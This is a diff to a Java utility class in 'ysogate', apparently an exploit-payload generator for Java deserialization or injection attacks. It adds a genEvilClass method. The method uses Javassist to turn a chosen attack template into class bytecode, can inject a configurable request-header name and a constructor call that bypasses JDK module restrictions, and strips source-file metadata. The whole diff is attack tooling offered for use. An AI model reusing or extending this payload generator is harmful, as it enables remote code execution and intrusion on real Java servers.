@@ -1,11 +1,15 @@
 package com.h2tg.ysogate.utils;
 
+import com.h2tg.ysogate.Main;
 import com.h2tg.ysogate.config.Config;
+import com.h2tg.ysogate.config.GenConfig;
 import javassist.*;
+import javassist.bytecode.AccessFlag;
 import javassist.bytecode.AttributeInfo;
 import javassist.bytecode.ClassFile;
 import javassist.bytecode.SourceFileAttribute;
 
+import java.util.Base64;
 import java.util.List;
 
 /**
@@ -131,4 +135,43 @@ public class CtClassUtils
         }
     }
 
+    public static byte[] genEvilClass(String className, String type, String sink) {
+        ClassPool pool = ClassPool.getDefault();
+        CtClass ctClass;
+        byte[] clazzbytes = null;
+        try{
+            pool.insertClassPath(new ClassClassPath(Main.class));
+            ctClass = pool.getCtClass("com.h2tg.ysogate.template." + type +"."+ sink);
+            ctClass.getClassFile().setVersionToJava5();
+            try {
+                if (GenConfig.reqHeaderName != null) {
+                    CtClassUtils.addMethod(ctClass, "getReqHeaderName", String.format("{return \"%s\";}", GenConfig.reqHeaderName));
+                }
+                ctClass.setName(className);
+                if (GenConfig.bypassModule) {
+                    CtMethod ctMethod = new CtMethod(CtClass.voidType, "bypassJDKModule", new CtClass[0], ctClass);
+                    ctMethod.setModifiers(AccessFlag.PUBLIC);
+                    ctMethod.setBody(bypassJDKModuleBody());
+                    ctClass.addMethod(ctMethod);
+
+                    // 添加 bypassJDKModule 调用
+                    CtConstructor constructor = ctClass.getConstructors()[0];
+                    constructor.setModifiers(javassist.Modifier.setPublic(constructor.getModifiers()));
+                    constructor.insertBeforeBody("bypassJDKModule();");
+                }
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+
+            CtClassUtils.removeSourceFileAttribute(ctClass);
+            ctClass.getClassFile().setVersionToJava5();
+            clazzbytes = ctClass.toBytecode();
+            ctClass.defrost();
+            ctClass.detach();
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+
+        return clazzbytes;
+    }
 }
